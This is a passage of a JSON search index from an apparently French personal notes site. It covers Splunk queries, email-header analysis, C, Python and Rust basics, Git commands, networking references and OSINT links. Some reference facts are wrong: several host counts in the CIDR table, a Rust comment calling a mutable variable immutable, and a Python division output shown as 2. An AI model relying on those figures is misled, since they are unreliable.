et Subdivisions","text":"<p>Grouper par Champ :</p> <pre><code>index=[nom_index] | stats count by [champ]`\n</code></pre> <p>Utiliser <code>timechart</code> pour des Tendances Temporelles :</p> <pre><code>index=[nom_index] | timechart count by [champ]`\n</code></pre>"},{"location":"Blue%20Team/Forensic/Splunk/Requ%C3%AAtes/#recherche-avancee","title":"Recherche Avanc\u00e9e","text":"<p>Recherche avec Sous-requ\u00eates :</p> <pre><code>index=[nom_index] [ search index=[autre_index] [champ]=[valeur] ]`\n</code></pre> <p>Jointures entre Sources de Donn\u00e9es :</p> <pre><code>index=[nom_index1] | join type=outer [champ] [ search index=[nom_index2] ]`\n</code></pre>"},{"location":"Blue%20Team/Forensic/Splunk/Requ%C3%AAtes/#extraction-et-transformation","title":"Extraction et Transformation","text":"<p>Extraire des Champs Automatiquement :</p> <pre><code>index=[nom_index] | extract`\n</code></pre> <p>Renommer des Champs :</p> <pre><code>index=[nom_index] | rename [ancien_nom] as [nouveau_nom]`\n</code></pre> <p>Utiliser <code>eval</code> pour des Calculs ou Transformations :</p> <pre><code>index=[nom_index] | eval [nouveau_champ]=[expression]`\n</code></pre>"},{"location":"Blue%20Team/Forensic/Splunk/Requ%C3%AAtes/#visualisation-et-exportation","title":"Visualisation et Exportation","text":"<p>G\u00e9n\u00e9rer un Tableau :</p> <pre><code>index=[nom_index] | table [champ1] [champ2] [champ3]`\n</code></pre> <p>Exporter des R\u00e9sultats :</p> <pre><code>index=[nom_index] | outputcsv [nom_fichier.csv]\n</code></pre>"},{"location":"Blue%20Team/Mails/Analyse%20de%20base/","title":"Analyse de base","text":"<p>Champs Header: <pre><code>- From, showing the sender's email address\n- To, showing the recipient's email address\n- Date, showing the date when the email was sent.\n</code></pre></p> <p>Champs optionnels: <pre><code>- Received, showing various information about the intermediary servers and the date when the message was processed\n- Reply-To, showing a reply address\n- subject, showing the message's subject\n- message-ID, showing a unique identification for the message\n- message body, containing the message, separated from the header by a line break\n</code></pre></p> <p>Artefacts: <pre><code>- Sending Address\n- Subject Line\n- Recipient(s)\n- Date and Time\n- Sending Server IP\n- Reverse DNS of Sending Server IP\n- Reply-To (if present)\n</code></pre></p>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Boucles/","title":"Boucles","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int i;\n\n    printf(\"Boucle for:\\n\");\n    for (i = 0; i &lt; 5; i++) {\n        printf(\"%d \", i);\n    }\n\n    printf(\"\\nBoucle while:\\n\");\n    i = 0;\n    while (i &lt; 5) {\n        printf(\"%d \", i);\n        i++;\n    }\n\n    return 0;\n}\n</code></pre> <ul> <li>Boucle <code>for</code> : Permet de r\u00e9p\u00e9ter un bloc de code un nombre sp\u00e9cifique de fois. La boucle ici compte de 0 \u00e0 4.</li> <li>Boucle <code>while</code> : Une autre structure de boucle. Elle ex\u00e9cute le bloc de code tant que la condition (<code>i &lt; 5</code>) est vraie.</li> </ul>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Conditions/","title":"Conditions","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int nombre = 5;\n\n    if (nombre &gt; 0) {\n        printf(\"Nombre est positif\\n\");\n    } \n    else {\n        printf(\"Nombre est n\u00e9gatif ou z\u00e9ro\\n\");\n    }\n\n    return 0;\n}\n</code></pre> <ul> <li>Ce snippet illustre l'utilisation de la structure conditionnelle <code>if-else</code>. Elle permet de prendre des d\u00e9cisions en fonction de la condition sp\u00e9cifi\u00e9e (<code>nombre &gt; 0</code> ici).</li> <li>Si la condition est vraie, le bloc <code>if</code> est ex\u00e9cut\u00e9. Sinon, le bloc <code>else</code> est ex\u00e9cut\u00e9.</li> </ul>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Fonctions/","title":"Fonctions","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint somme(int a, int b) {\n    return a + b;\n}\n\nint main() {\n    int result = somme(5, 3);\n    printf(\"R\u00e9sultat: %d\\n\", result);\n    return 0;\n}\n</code></pre> <ul> <li>D\u00e9finit une fonction <code>somme</code> qui prend deux param\u00e8tres (deux entiers) et renvoie leur somme.</li> <li>Dans <code>main</code>, la fonction <code>somme</code> est appel\u00e9e avec deux arguments (5 et 3) et le r\u00e9sultat est stock\u00e9 dans <code>result</code>, puis affich\u00e9.</li> </ul>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Pointeur/","title":"Pointeur","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int var = 100;\n    int *ptr;\n\n    ptr = &amp;var;\n\n    printf(\"Valeur de var: %d\\n\", var);\n    printf(\"Adresse de var: %p\\n\", &amp;var);\n    printf(\"Valeur point\u00e9e par ptr: %d\\n\", *ptr);\n\n    return 0;\n}\n</code></pre> <ul> <li>Un pointeur <code>ptr</code> est d\u00e9clar\u00e9. Il est con\u00e7u pour stocker l'adresse d'une variable de type <code>int</code>.</li> <li><code>&amp;var</code> obtient l'adresse de la variable <code>var</code>, et <code>ptr = &amp;var</code> assigne cette adresse au pointeur.</li> <li><code>*ptr</code> est utilis\u00e9 pour acc\u00e9der \u00e0 la valeur \u00e0 l'adresse stock\u00e9e dans le pointeur, affichant ainsi la valeur de <code>var</code>.</li> </ul> <p>Un cas simple et classique de l'utilisation des pointeurs en C est le passage d'arguments par r\u00e9f\u00e9rence \u00e0 une fonction. Cela permet \u00e0 la fonction de modifier la valeur des arguments pass\u00e9s, ce qui est impossible avec un passage d'arguments par valeur (le mode par d\u00e9faut en C).</p> <p>Imaginons que vous vouliez \u00e9crire une fonction qui \u00e9change les valeurs de deux variables. Sans pointeurs, vous ne pourriez pas faire cela directement, car toute modification \u00e0 une variable pass\u00e9e \u00e0 une fonction serait locale \u00e0 cette fonction. Mais avec les pointeurs, vous pouvez passer les adresses des variables et modifier leurs valeurs directement.</p> <p>Voici un exemple simple :</p> <pre><code>#include &lt;stdio.h&gt;  \n// Fonction pour \u00e9changer les valeurs de deux variables \n\nvoid swap(int *x, int *y) {     \nint temp = *x;     \n*x = *y;     \n*y = temp; \n}  \n\nint main() {     \nint a = 10;     \nint b = 20;      \nprintf(\"Avant le swap : a = %d, b = %d\\n\", a, b);      \n\n// Appel de la fonction swap avec les adresses de a et b     \n\nswap(&amp;a, &amp;b);      \nprintf(\"Apr\u00e8s le swap : a = %d, b = %d\\n\", a, b);      \nreturn 0; \n}\n</code></pre> <p>Dans cet exemple :</p> <ol> <li> <p>Fonction <code>swap</code> : Prend deux pointeurs <code>int *x</code> et <code>int *y</code> comme arguments, qui sont les adresses des variables <code>a</code> et <code>b</code>.</p> </li> <li> <p>Echange des valeurs : Dans <code>swap</code>, <code>*x</code> et <code>*y</code> permettent d'acc\u00e9der aux valeurs stock\u00e9es aux adresses point\u00e9es par <code>x</code> et <code>y</code>, respectivement. La fonction \u00e9change ces valeurs.</p> </li> <li> <p>Passage des adresses : Lorsque vous appelez <code>swap(&amp;a, &amp;b)</code>, vous passez les adresses de <code>a</code> et <code>b</code>, permettant \u00e0 la fonction <code>swap</code> de modifier les variables originales.</p> </li> </ol> <p>Ce cas illustre bien la puissance des pointeurs en permettant des modifications directes sur les variables pass\u00e9es \u00e0 une fonction, ce qui serait impossible autrement en C.</p>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Structure%20programme%20simple/","title":"Structure programme simple","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    printf(\"Bonjour, le monde!\\n\");\n    return 0;\n}\n</code></pre> <ul> <li><code>#include &lt;stdio.h&gt;</code> : Ceci est une directive de pr\u00e9processeur. Elle indique au compilateur d'inclure le contenu du fichier d'en-t\u00eate standard <code>stdio.h</code>. Ce fichier est n\u00e9cessaire pour utiliser la fonction <code>printf</code>.</li> <li><code>int main()</code> : D\u00e9clare la fonction principale <code>main</code>. En C, <code>main</code> est le point d'entr\u00e9e de tout programme. Le programme commence \u00e0 s'ex\u00e9cuter \u00e0 partir de cette fonction. <code>int</code> signifie que <code>main</code> renvoie un entier.</li> <li><code>printf(\"Bonjour, le monde!\\n\");</code> : <code>printf</code> est utilis\u00e9e pour afficher la cha\u00eene de caract\u00e8res entre guillemets sur la console. <code>\\n</code> est un caract\u00e8re sp\u00e9cial qui repr\u00e9sente une nouvelle ligne.</li> <li><code>return 0;</code> : Indique que le programme s'est ex\u00e9cut\u00e9 avec succ\u00e8s. Le <code>0</code> est renvoy\u00e9 au syst\u00e8me d'exploitation.</li> </ul>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Structures/","title":"Structures","text":"<p>En programmation en C, les structures (ou \"structs\") sont des types de donn\u00e9es qui permettent de regrouper plusieurs variables de types diff\u00e9rents sous un m\u00eame nom. Elles sont utiles pour organiser et manipuler des donn\u00e9es complexes de mani\u00e8re efficace.</p> <p>Voici un exemple d\u00e9taill\u00e9 d'une structure en C et son utilisation :</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// D\u00e9finition de la structure \"Personne\"\nstruct Personne {\n    char nom[50];\n    int age;\n    float taille;\n};\n\nint main() {\n    // D\u00e9claration d'une variable de type \"Personne\"\n    struct Personne personne1;\n\n    // Initialisation des champs de la structure \"personne1\"\n    strcpy(personne1.nom, \"Jean Dupont\");\n    personne1.age = 30;\n    personne1.taille = 1.75;\n\n    // Affichage des informations de la personne\n    printf(\"Nom: %s\\n\", personne1.nom);\n    printf(\"Age: %d\\n\", personne1.age);\n    printf(\"Taille: %.2f\\n\", personne1.taille);\n\n    // Modification de l'\u00e2ge de la personne\n    personne1.age = 35;\n\n    // Affichage des informations mises \u00e0 jour\n    printf(\"Nouvel \u00e2ge: %d\\n\", personne1.age);\n\n    return 0;\n}\n</code></pre> <p>Dans cet exemple :</p> <ul> <li>Une structure <code>Personne</code> est d\u00e9finie avec trois champs : <code>nom</code> (une cha\u00eene de caract\u00e8res), <code>age</code> (un entier) et <code>taille</code> (un nombre \u00e0 virgule flottante).</li> <li>Dans la fonction <code>main()</code>, une variable de type <code>Personne</code> appel\u00e9e <code>personne1</code> est d\u00e9clar\u00e9e.</li> <li>Les champs de la structure <code>personne1</code> sont initialis\u00e9s avec des valeurs sp\u00e9cifiques \u00e0 l'aide de la fonction <code>strcpy()</code> pour le nom et d'assignations directes pour l'\u00e2ge et la taille.</li> <li>Les informations de la personne sont affich\u00e9es \u00e0 l'\u00e9cran.</li> <li>L'\u00e2ge de la personne est ensuite mis \u00e0 jour en modifiant directement le champ <code>age</code> de la structure <code>personne1</code>.</li> <li>Les informations mises \u00e0 jour sont ensuite affich\u00e9es \u00e0 nouveau.</li> </ul> <p>Les structures en C permettent donc de regrouper des donn\u00e9es associ\u00e9es sous une m\u00eame entit\u00e9, ce qui facilite la manipulation et la gestion des informations dans un programme.</p>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Tableaux/","title":"Tableaux","text":"<p>En programmation en C, les tableaux sont des structures de donn\u00e9es permettant de stocker une collection ordonn\u00e9e d'\u00e9l\u00e9ments de m\u00eame type sous un m\u00eame nom. Voici un exemple d\u00e9taill\u00e9 d'un tableau en C et son utilisation :</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    // D\u00e9claration et initialisation d'un tableau d'entiers\n    int tableau_entiers[5] = {10, 20, 30, 40, 50};\n\n    // Affichage des \u00e9l\u00e9ments du tableau\n    printf(\"El\u00e9ments du tableau d'entiers :\\n\");\n    for (int i = 0; i &lt; 5; i++) {\n        printf(\"%d \", tableau_entiers[i]);\n    }\n    printf(\"\\n\");\n\n    // Acc\u00e8s et modification d'un \u00e9l\u00e9ment du tableau\n    tableau_entiers[2] = 35;\n\n    // Affichage du tableau apr\u00e8s modification\n    printf(\"Tableau apr\u00e8s modification :\\n\");\n    for (int i = 0; i &lt; 5; i++) {\n        printf(\"%d \", tableau_entiers[i]);\n    }\n    printf(\"\\n\");\n\n    return 0;\n}\n</code></pre> <p>Dans cet exemple :</p> <ul> <li>Un tableau d'entiers <code>tableau_entiers</code> de taille 5 est d\u00e9clar\u00e9 et initialis\u00e9 avec les valeurs <code>{10, 20, 30, 40, 50}</code>.</li> <li>Les \u00e9l\u00e9ments du tableau sont ensuite affich\u00e9s \u00e0 l'aide d'une boucle <code>for</code>.</li> <li>Un \u00e9l\u00e9ment du tableau est modifi\u00e9 en acc\u00e9dant \u00e0 l'indice correspondant (<code>tableau_entiers[2]</code>) et en lui attribuant une nouvelle valeur (<code>35</code>).</li> <li>Le tableau est \u00e0 nouveau affich\u00e9 pour montrer la modification.</li> </ul> <p>Les tableaux en C sont utiles pour stocker des collections d'\u00e9l\u00e9ments de mani\u00e8re efficace et les manipuler \u00e0 l'aide d'indices. Ils sont souvent utilis\u00e9s dans de nombreux algorithmes et structures de donn\u00e9es.</p>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Variables%20et%20types/","title":"Variables et types","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int entier = 10;\n    float flottant = 10.5;\n    char caractere = 'A';\n\n    printf(\"Entier: %d, Flottant: %f, Caract\u00e8re: %c\\n\", entier, flottant, caractere);\n    return 0;\n}\n</code></pre> <ul> <li>Trois types de variables sont d\u00e9clar\u00e9s ici : <code>int</code> (entier), <code>float</code> (nombre \u00e0 virgule flottante) et <code>char</code> (caract\u00e8re). Chaque type sert \u00e0 stocker un type de donn\u00e9es sp\u00e9cifique.</li> <li>La fonction <code>printf</code> est utilis\u00e9e pour afficher les valeurs de ces variables. <code>%d</code>, <code>%f</code>, et <code>%c</code> sont des sp\u00e9cificateurs de format qui indiquent \u00e0 <code>printf</code> comment interpr\u00e9ter les valeurs (respectivement comme entier, flottant, et caract\u00e8re).</li> </ul>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Cheatsheet/Git/","title":"Git","text":""},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Cheatsheet/Git/#configuration-initiale","title":"Configuration Initiale","text":"<p>Configuration du nom d'utilisateur</p> <pre><code>git config --global user.name \"Votre Nom\"\n</code></pre> <p>Configuration de l'email</p> <pre><code>git config --global user.email \"votre.email@example.com\"\n</code></pre> <p>Afficher la configuration</p> <pre><code>git config --list\n</code></pre> <p>\u00c9diter la configuration</p> <pre><code>git config --global --edit\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Cheatsheet/Git/#commandes-de-base","title":"Commandes de Base","text":"<p>Initialiser un d\u00e9p\u00f4t Git</p> <pre><code>git init\n</code></pre> <p>Cloner un d\u00e9p\u00f4t existant</p> <pre><code>git clone &lt;url&gt;\n</code></pre> <p>Ajouter des fichiers au staging area</p> <pre><code>git add &lt;fichier&gt;\ngit add .\n</code></pre> <p>V\u00e9rifier le statut des fichiers</p> <pre><code>git status\n</code></pre> <p>Afficher les modifications</p> <pre><code>git diff\n</code></pre> <p>Commiter les changements</p> <pre><code>git commit -m \"Message du commit\"\n</code></pre> <p>Afficher l'historique des commits</p> <pre><code>git log\ngit log --oneline --graph --all\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Cheatsheet/Git/#branches","title":"Branches","text":"<p>Lister les branches</p> <pre><code>git branch\n</code></pre> <p>Cr\u00e9er une nouvelle branche</p> <pre><code>git branch &lt;nom_branche&gt;\n</code></pre> <p>Changer de branche</p> <pre><code>git checkout &lt;nom_branche&gt;\n</code></pre> <p>Cr\u00e9er et changer de branche</p> <pre><code>git checkout -b &lt;nom_branche&gt;\n</code></pre> <p>Fusionner une branche dans la branche courante</p> <pre><code>git merge &lt;nom_branche&gt;\n</code></pre> <p>Supprimer une branche</p> <pre><code>git branch -d &lt;nom_branche&gt;\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Cheatsheet/Git/#remote-repositories","title":"Remote Repositories","text":"<p>Ajouter un d\u00e9p\u00f4t distant</p> <pre><code>git remote add origin &lt;url&gt;\n</code></pre> <p>V\u00e9rifier les d\u00e9p\u00f4ts distants</p> <pre><code>git remote -v\n</code></pre> <p>R\u00e9cup\u00e9rer les modifications depuis le d\u00e9p\u00f4t distant</p> <pre><code>git fetch origin\n</code></pre> <p>R\u00e9cup\u00e9rer et fusionner les modifications du d\u00e9p\u00f4t distant</p> <pre><code>git pull origin &lt;nom_branche&gt;\n</code></pre> <p>Envoyer les commits locaux vers le d\u00e9p\u00f4t distant</p> <pre><code>git push origin &lt;nom_branche&gt;\n</code></pre> <p>Supprimer un d\u00e9p\u00f4t distant</p> <pre><code>git remote remove &lt;nom_d\u00e9p\u00f4t&gt;\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Python/Bases/","title":"Bases","text":"<pre><code>print(\"Hello\")\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Python/Bases/#variables","title":"Variables","text":"<pre><code>greeting = 'Hello again'\nprint(greeting)\n</code></pre> <pre><code>a = 'HTB'\nb = 'Academy'\nprint(a, b)\n---\nHTB Academy\n</code></pre> <pre><code>add = 10 + 10\nsub = 20 - 10\nmulti = 5 * 5\ndiv = 10 / 5\nprint(add, sub, multi, div)\n---\n20 10 25 2\n</code></pre> <pre><code>happy = 2\n\nif happy == 1:\n    print(\"Happy and we know it!\")\nelif happy == 2:\n    print(\"Excited about it!\")\nelse:\n    print(\"Not happy...\")\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Python/Bases/#boucle-while","title":"Boucle while","text":"<pre><code>counter = 0\n\nwhile counter &lt; 5:\n    print(f'Hello #{counter}')\n    counter = counter + 1\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Python/Bases/#list","title":"List","text":"<pre><code>groceries = ['Walnuts', 'Grapes', 'Bird seeds']\n\n# syntaxe alternative :\n\ngroceries = [\n    'Walnuts',    # index 0\n    'Grapes',     # index 1\n    'Bird seeds'  # index 2\n]\n</code></pre> <pre><code>var = \"ABCDEF\"\nprint(var[0], var[1], var[2], var[3], var[4], var[5])\n---\nA B C D E F\n\n\nprint(var[-1], var[-2], var[-3], var[-4], var[-5], var[-6])\n---\nF E D C B A\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Python/Bases/#boucle-for-each","title":"Boucle for each","text":"<pre><code>groceries = ['Walnuts', 'Grapes', 'Bird seeds']\n\nfor food in groceries:\n    print(f'I bought some {food} today.')\n\n---\nI bought some Walnuts today.\nI bought some Grapes today.\nI bought some Bird seeds today.\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Rust/Bases/","title":"Bases","text":""},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Rust/Bases/#hello-world","title":"Hello world","text":"<pre><code>fn main() {\n    // Our main function does one task: show a message\n    // println! displays the input \"Hello, world!\" to the screen\n    println!(\"Hello, world!\");\n}\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Rust/Bases/#substitution","title":"Substitution","text":"<pre><code>fn main() {\n    // Call println! with three arguments: a string, a value, a value\n    println!(\"The first letter of the English alphabet is {} and the last letter is {}.\", 'A', 'Z');\n}\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Rust/Bases/#variables","title":"Variables","text":"<p>Immuable: <pre><code>// Declare a variable\nlet a_number;\n\n// Declare a second variable and bind the value\nlet a_word = \"Ten\";\n\n// Bind a value to the first variable\na_number = 10;\n\nprintln!(\"The number is {}.\", a_number);\nprintln!(\"The word is {}.\", a_word);\n</code></pre></p> <p>Mutable: <pre><code>// The `mut` keyword lets the variable be changed\nlet mut a_number = 10; \nprintln!(\"The number is {}.\", a_number);\n\n// Change the value of an immutable variable\na_number = 15;\nprintln!(\"Now the number is {}.\", a_number);\n</code></pre></p> <p>Mise en m\u00e9moire fant\u00f4me:</p> <pre><code>// Declare first variable binding with name \"shadow_num\"\nlet shadow_num = 5;\n\n// Declare second variable binding, shadows existing variable \"shadow_num\" \nlet shadow_num = shadow_num + 5; \n\n// Declare third variable binding, shadows second binding of variable \"shadow_num\"\nlet shadow_num = shadow_num * 2; \n\nprintln!(\"The number is {}.\", shadow_num);\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Rust/Bases/#typer-une-variable","title":"Typer une variable","text":"<pre><code>let number: u32 = 14;\nprintln!(\"The number is {}.\", number);\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Rust/Bases/#tuple","title":"Tuple","text":"<pre><code>// Declare a tuple of three elements\nlet tuple_e = ('E', 5i32, true);\n\n// Use tuple indexing and show the values of the elements in the tuple\nprintln!(\"Is '{}' the {}th letter of the alphabet? {}\", tuple_e.0, tuple_e.1, tuple_e.2);\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/Rust/Bases/#struct","title":"Struct","text":"<pre><code>// Instantiate classic struct, specify fields in random order, or in specified order\nlet user_1 = Student { name: String::from(\"Constance Sharma\"), remote: true, level: 2 };\nlet user_2 = Student { name: String::from(\"Dyson Tan\"), level: 5, remote: false };\n\n// Instantiate tuple structs, pass values in same order as types defined\nlet mark_1 = Grades('A', 'A', 'B', 'A', 3.75);\nlet mark_2 = Grades('B', 'A', 'A', 'C', 3.25);\n\nprintln!(\"{}, level {}. Remote: {}. Grades: {}, {}, {}, {}. Average: {}\", user_1.name, user_1.level, user_1.remote, mark_1.0, mark_1.1, mark_1.2, mark_1.3, mark_1.4);\n\nprintln!(\"{}, level {}. Remote: {}. Grades: {}, {}, {}, {}. Average: {}\", user_2.name, user_2.level, user_2.remote, mark_2.0, mark_2.1, mark_2.2, mark_2.3, mark_2.4);\n</code></pre>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/CIDR/","title":"CIDR","text":"Longueur CIDR Masque Nombre de r\u00e9seaux H\u00f4tes /1 128.0.0.0 128 A 2,147,483,392 /2 192.0.0.0 64 A 1,073,741,696 /3 224.0.0.0 32 A 536,870,848 /4 240.0.0.0 16 A 268,435,424 /5 248.0.0.0 8 A 134,217,712 /6 252.0.0.0 4 A 67,108,856 /7 254.0.0.0 2 A 33,554,428 /8 255.0.0.0 1 A 16,777,214 /9 255.128.0.0 128 B 8,388,352 /10 255.192.0.0 64 B 4,194,176 /11 255.224.0.0 32 B 2,097,088 /12 255.240.0.0 16 B 1,048,544 /13 255.248.0.0 8 B 524,272 /14 255.252.0.0 4 B 262,136 /15 255.254.0.0 2 B 131,068 /16 255.255.0.0 1 B 65,534 /17 255.255.128.0 128 C 32,512 /18 255.255.192.0 64 C 16,256 /19 255.255.224.0 32 C 8,128 /20 255.255.240.0 16 C 4,064 /21 255.255.248.0 8 C 2,032 /22 255.255.252.0 4 C 1,016 /23 255.255.254.0 2 C 508 /24 255.255.255.0 1 C 254 /25 255.255.255.128 2 sous-r\u00e9seaux 124 /26 255.255.255.192 4 sous-r\u00e9seaux 62 /27 255.255.255.224 8 sous-r\u00e9seaux 30 /28 255.255.255.240 16 sous-r\u00e9seaux 14 /29 255.255.255.248 32 sous-r\u00e9seaux 6 /30 255.255.255.252 64 sous-r\u00e9seaux 2 /31 255.255.255.254 Aucun Aucun /32 255.255.255.255 1/256 C 1"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/CIDR/#les-classes-non-routables","title":"Les classes non routables","text":"<p>https://www.iana.org/help/abuse-answers</p> <p>10.0.0.0 \u00e0 10.255.255.255 (10.0.0.0/8) 172.16.0.0 \u00e0 172.31.255.255 (172.16.0.0/12) 192.168.0.0 \u00e0 192.168.255.255 (192.168.0.0/16) 127.0.0.0 \u00e0 127.255.255.255 (LoopBack 127.0.0.0/8) 169.254.0.0 \u00e0 169.254.255.255 (APIPA 169.254.0.0/16) 224.0.0.0 \u00e0 239.255.255.255 (Multicast 224.0.0.0/4) 100.64.0.0 \u00e0 100.127.255.255 (CGN RFC6598 100.64.0.0/10)</p>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/","title":"Les diff\u00e9rents r\u00e9seaux","text":""},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/#le-pan-personal-area-network","title":"Le pan (Personal Area Network)","text":"<p>Le PAN permet d\u2019\u00e9changer des donn\u00e9es entre des appareils proches (g\u00e9n\u00e9ralement dans la m\u00eame pi\u00e8ce). Pour ce faire, il existe 2 techniques de transmission physique, l\u2019USB et le FireWire. Il est \u00e9galement possible de relier deux appareils via le WPAN (r\u00e9seau personnel sans fil) avec des technologiques comme l\u2019USB sans fil, le Bluetooth ou le Z-Wave.</p> <p>Il est \u00e9galement possible de relier un r\u00e9seau PAN vers d\u2019autres r\u00e9seaux plus grands.\u00a0</p>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/#le-lan-local-area-network","title":"Le lan (Local Area Network)","text":"<p>Si vous avez besoin de relier plusieurs ordinateurs sur un r\u00e9seau, vous cr\u00e9ez un LAN ou r\u00e9seau local. Pour ce faire, nous utilisons le plus souvent le protocole Ethernet.</p> <p>Pour connecter plus de 2 ordinateurs ensemble, il est n\u00e9cessaire d\u2019ajouter d\u2019autres \u00e9l\u00e9ments, comme un hub ou un commutateur r\u00e9seau. Ces \u00e9l\u00e9ments agissent comme des noeuds de distribution ou des \u00e9l\u00e9ments de couplage.\u00a0</p> <p>Le LAN permet de transmettre une grande quantit\u00e9 de donn\u00e9es rapidement. Celui-ci vous permet de partager des serveurs de fichiers, imprimantes ou encore des applications.\u00a0</p> <p>Il est \u00e9galement possible de se connecter via le WLAN (Wireless Local Area Network) ou r\u00e9seau local sans fil (Wifi).\u00a0</p> <p>Bien que les deux solutions soient possibles, l\u2019Ethernet offre plus de s\u00e9curit\u00e9 et un d\u00e9bit de donn\u00e9es plus important.</p>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/#le-man-metropolitan-area-network","title":"Le man (Metropolitan Area Network)","text":"<p>Le MAN permet de relier plusieurs LAN proches. Celui-ci permet d\u2019\u00e9changer tr\u00e8s rapidement des donn\u00e9es entre diff\u00e9rentes branches d\u2019une soci\u00e9t\u00e9 par exemple. En utilisant la fibre optique et des routeurs assez puissants, l\u2019\u00e9change de donn\u00e9es est plus rapide que via l\u2019internet.\u00a0</p>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/#le-wan-wide-area-network","title":"Le wan (Wide Area Network)","text":"<p>Le WAN permet de relier diff\u00e9rentes machines tr\u00e8s \u00e9loign\u00e9es (\u00e0 l\u2019\u00e9chelle d\u2019un continent). Pour ce faire, le WAN se base sur les technologies des adresses IP, de SDH ou encore des ATM.</p> <p>Les WAN sont souvent g\u00e9r\u00e9s par nos fournisseurs de services Internet.\u00a0</p>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/#le-gan-global-area-network","title":"Le gan (Global Area Network)","text":"<p>Basiquement, internet est un GAN, un r\u00e9seau mondial permettant d\u2019\u00e9changer des informations entre diff\u00e9rents appareils. Mais internet n\u2019est pas le seul GAN. De nombreuses entreprises utilisent un GAN pour relier diff\u00e9rents WAN ensemble. Les GAN utilisent des c\u00e2bles sous marins et des transmissions par satellite.</p>"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/OSI/","title":"OSI","text":"Layer Typical Use Protocols Applic\u00adation End User Layer HTTP, FTP, SSH, DNS Presen\u00adtation Syntax Layer SSL, SSH, IMAP, MPEG, JPEG Session Sync &amp; Send Layer APIs, Sockets Transport End-to-end Connec\u00adtions TCP, UDP Network Packets IP, ICMP, IPSec, IGMP Data Link Frames Ethernet, PPP, Switch Physical Physical Structure Fiber, Access Points, Copper Cabling"},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Topologies/","title":"Topologies","text":""},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Topologies/#anneau","title":"Anneau","text":""},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Topologies/#bus","title":"Bus","text":""},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Topologies/#etoile","title":"Etoile","text":""},{"location":"Dev%20-%20Admin%20-%20R%C3%A9seaux/R%C3%A9seaux/Topologies/#maille","title":"Maill\u00e9","text":""},{"location":"Osint/Tools%20locaux/Webcams%20publiques/","title":"Webcams publiques","text":"<p>https://github.com/josh0xA/Pantheon</p>"},{"location":"Osint/Tools%20online/Lieux/","title":"Lieux","text":"<p>Outil de cartographie : https://www.cachesleuth.com/</p> <p>Recherche de donn\u00e9es g\u00e9ographiques (FR) : https://www.geoportail.gouv.fr/</p> <p>Infrastructures ferroviaires (monde) : https://www.openrailwaymap.org/</p> <p>Recherches sur les montagnes/reliefs (monde) : https://www.peakfinder.com/</p> <p>Identification des montagnes/reliefs (monde) : https://peakvisor.com/</p> <p>Donn\u00e9es sur les \u00e9clairages publiques : 